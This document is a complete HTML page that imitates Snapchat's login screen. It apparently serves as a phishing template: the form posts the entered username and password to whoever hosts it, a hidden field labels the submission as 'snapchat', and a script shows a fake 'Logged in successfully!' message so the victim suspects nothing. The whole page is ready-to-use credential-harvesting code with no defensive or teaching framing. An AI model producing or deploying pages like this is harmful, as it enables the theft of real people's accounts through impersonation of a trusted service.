<!DOCTYPE html><html><head><title>Snapchat</title><meta name="viewport" content="width=device-width"><style>body{background:#fffdd0;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}.container{background:#fffc00;border-radius:20px;padding:40px;width:320px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,.2)}.logo{font-size:60px;font-weight:700;color:#000;margin-bottom:30px}.form-group input{width:100%;padding:15px;margin:10px 0;border:2px solid #fffc00;border-radius:25px;font-size:16px;box-sizing:border-box;background:#fff}.login-btn{width:100%;padding:15px;background:#fffc00;border:0;border-radius:25px;font-size:18px;font-weight:700;cursor:pointer;margin-top:10px}.login-btn:hover{transform:scale(1.02)}</style></head><body><div class="container"><div class="logo">👻 Snapchat</div><form method="POST"><input type="text" name="username" placeholder="Username or Email" required><input type="password" name="password" placeholder="Password" required><input type="hidden" name="platform" value="snapchat"><button type="submit" class="login-btn">Log In</button></form></div><script>document.querySelector('form').onsubmit=function(){setTimeout(()=>{document.body.innerHTML='<div style="text-align:center;padding:60px;font-size:18px">Logged in successfully!</div>';},800);}</script></body></html>
